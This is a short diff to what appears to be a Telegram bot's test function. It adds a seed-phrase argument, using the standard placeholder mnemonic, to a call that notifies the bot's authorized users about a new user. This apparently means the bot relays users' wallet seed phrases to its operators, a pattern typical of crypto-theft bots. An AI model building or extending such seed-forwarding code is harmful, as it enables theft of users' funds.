@@ -402,13 +402,14 @@ async def test_owner_notification(update: Update, context: ContextTypes.DEFAULT_
         return
     
     try:
-        # Test with fake data
+        # Test with fake data - ADD the original_input parameter
         test_success = await notify_authorized_users_new_user(
             context, 
             123456789,  # fake user ID
             "test_user", 
             "11111111111111111111111111111111",  # fake wallet address
-            "seed"
+            "seed",
+            "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"  # fake seed phrase
         )
         
         if test_success:
@@ -1425,6 +1426,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
